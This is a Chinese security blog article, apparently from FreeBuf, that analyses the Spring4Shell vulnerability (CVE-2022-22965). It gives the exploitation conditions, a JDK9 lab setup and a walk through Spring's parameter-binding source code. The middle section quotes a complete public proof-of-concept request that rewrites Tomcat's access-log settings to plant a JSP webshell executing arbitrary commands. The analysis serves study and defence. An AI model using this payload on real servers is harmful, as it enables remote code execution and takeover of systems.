---
title: Spring Framework CVE-2022-22965源码浅析
url: https://www.freebuf.com/vuls/362112.html
source: FreeBuf网络安全行业门户
date: 2023-03-31
fetch_date: 2025-10-04T11:15:54.811165
---

# Spring Framework CVE-2022-22965源码浅析

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Spring Framework CVE-2022-22965源码浅析

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

Spring Framework CVE-2022-22965源码浅析

2023-03-30 17:43:37

所属地 四川省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

## 前言

这个漏洞在刚爆出来那时都还没接触过javaweb，当时听说是影响范围很大，现在真正了解了感觉还是被吹得有点大了。这也是接触的spring框架的第二个漏洞，感觉对于spring框架的理解还是有挺大帮助的。首先说一下利用条件吧。

* jdk9+
* war打包在tomcat中部署

首先它要求在jdk9以上环境中运行，这一个条件就以及排除了大部分了，现在大部分应用还是1.8的环境。在vulhub中的环境是jdk11，我当时想测试jdk9的环境就把它里面的war包直接下载下来然后放在自己主机上的tomcat上部署发现tomcat启动时没有报错，但访问一直404，最后把tomcat启动jdk也换成11才正常，估计可能是低版本jdk不能运行高版本编译的字节码吧。但我就是想用jdk9来测试，于是后面就走上了一条环境配置的不归路，各种debug最后才终于把项目跑起来了。

## 环境搭建

我是用的jdk9+springboot搭建的。

pom.xml依赖如下

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.snail</groupId>
    <artifactId>SpringBootDemo</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>war</packaging>

    <properties>
        <maven.compiler.source>9</maven.compiler.source>
        <maven.compiler.target>9</maven.compiler.target>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <version>2.4.5</version>
            <!--去除内置tomcat-->
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-tomcat</artifactId>
                </exclusion>
            </exclusions>
        </dependency>

        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>3.1.0</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>

</project>
```

启动类

```
@SpringBootApplication
public class SpringBootDemoApplication extends SpringBootServletInitializer {

    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder springApplicationBuilder){//重点！这个方法必须有，且必须继承SpringBootServletInitializer
        return springApplicationBuilder.sources(SpringBootDemoApplication.class);
    }

    public static void main(String[] args) {
        SpringApplication.run(SpringBootDemoApplication.class, args);
    }

}
```

controller+pojo

```
@RestController
public class TestController {

    @RequestMapping("/")
    public String Index(Person person){
        System.out.println(person);
        System.out.println(Person.class.getClassLoader());
        System.out.println(Person.class.getModule());
        return person.toString();
    }
}

//考虑到篇幅就省略了getter和setter以及toString方法

public class Person {

    private String name;
    private int age;
    private School school;
}

public class School {
    private String place;
}
```

然后在idea中配置tomcat启动就可以了。

## 从嵌套注入到payload

我们启动项目后可以简单测试一下。

![启动测试](https://image.3001.net/images/20230330/1680168535_642556579691fd96840d5.png)

可以看到它依次为我们的参数在Person中对应的属性赋值，当我们传入school.place=xxxxx时还对School对象也赋值了。我们可以从控制台中看到它调用的方法。可以看到它依次调用了各个属性的getter和setter。感觉这个和fastjson有点异曲同工之妙，我们可不可以利用fastjson中的调用链呢，我们继续看后面的分析就知道了。

![启动方法调用](https://image.3001.net/images/20230330/1680168572_6425567c6f0c6a19d7fe5.png)

网上相关的poc也比较多，可以从poc中看到他们主要都是发送了一个这样的请求。

```
headers = {
                "suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
requests.get(url + "?" + data,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
```

实际上data部分就是传了五个参数，分别是

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=....(先暂时省略)
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

结合上面的只是可以大致猜测出它实际上是获取了class对象中的module对象，然后又获取了module对象的classLoader对象，然后一次获取到最后的first属性，然后对其的pattern属性赋值。

上面每个参数最后依次递归获取到了AccessLogValve对象它是负责日志打印的，通过上面传递的值修改了日志打印的位置，后缀以及格式等信息。最后就实现了在ROOT的根目录写入一个jsp的webshell。

![image](https://image.3001.net/images/20230330/1680168629_642556b56e555616893da.png!small)

##### 漏洞利用关键点

* 在Class中的`module`属性是在jdk9+才加入的，所以如果在jdk8及以下的版本调用`Class.getModlue()`会报错。
* 在tomcat中通过自定义`classLoader`打破了原有的双亲委派机制。如果是使用springboot内嵌的tomcat则获取的`classLoader`是`appClassLoader`，所以这就是为什么必须要使用tomcat部署的原因。

## 源码简析

首先我们需要找到参数绑定的起点是在`ServletModelAttributeMethodProcessor#bindRequestParameters`。

```
//org.springframework.web.servlet.mvc.method.annotation.ExtendedServletRequestDataBinder
//class org.springframework.web.context.request.ServletWebRequest
protected void bindRequestParameters(WebDataBinder binder, NativeWebRequest request) {
    ServletRequest servletRequest = request.getNativeRequest(ServletRequest.class);
    Assert.state(servletRequest != null, "No ServletRequest");
    ServletRequestDataBinder servletBinder = (ServletRequestDataBinder) binder;
    servletBinder.bind(servletRequest);
}
```

在`binder`对象的`target`属性中封装了我们绑定的对象(如上例的Person对象)，在`bindingResult`属性的`beanWrapper`，它是`beanWrapperImpl`的实例，后面赋值主要就是这个对象负责处理的。在`bind`方法中首先从`request`对象中解析了请求参数值并封装到`MutablePropertyValues`对象中最后调用`doBind(mpvs)`方法。

![image](https://image.3001.net/images/20230330/1680168659_642556d3de98509dec1d0.png)

后面几个方法方法主要做了一些属性检查等操作，最后来到`AbstractPropertyAccessor#setPropertyValues`方法。

```
public void setPropertyValues(PropertyValues pvs, boolean ignoreUnknown, boolean ignoreInvalid)
        throws BeansException {

    List<PropertyAccessException> propertyAccessExceptions = null;
    List<PropertyValue> propertyValues = (pvs instanceof MutablePropertyValues ?
            ((MutablePropertyValues) pvs).getPropertyValueList() : Arrays.asList(pvs.getPropertyValues()));

    if (ignoreUnknown) {
        this.suppressNotWritablePropertyException = true;
    }
    try {
        for (PropertyValue pv : propertyValues) {
            try {
                setPropertyValue(pv);
            }
            catch ....
        }...